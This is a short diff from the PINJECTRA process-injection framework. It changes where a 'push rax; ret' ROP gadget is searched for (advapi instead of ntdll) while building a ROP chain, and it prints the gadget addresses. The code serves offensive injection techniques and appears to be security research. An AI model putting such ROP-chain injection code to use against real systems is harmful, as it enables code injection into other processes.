@@ -252,7 +252,7 @@ PINJECTRA_PACKET* _ROP_CHAIN_1::eval(TStrDWORD64Map& runtime_parameters)
 	printf("GADGET_RBXtoRAX=0x%llx\n", GADGET_RBXtoRAX);
 
 	//0x000000018003afb4 : push rax; ret // 50c3
-	DWORD64 GADGET_RAX_pivot = (DWORD64)memmem(((BYTE*)ntdll) + 0x2000, size - 0x1000, "\x50\xc3", 2);
+	DWORD64 GADGET_RAX_pivot = (DWORD64)memmem(((BYTE*)advapi) + 0x1000, size - 0x1000, "\x50\xc3", 2);
 	printf("GADGET_RAX_pivot=0x%llx\n", GADGET_RAX_pivot);
 
 	ROP_chain = (DWORD64*)malloc(100 * sizeof(DWORD64));
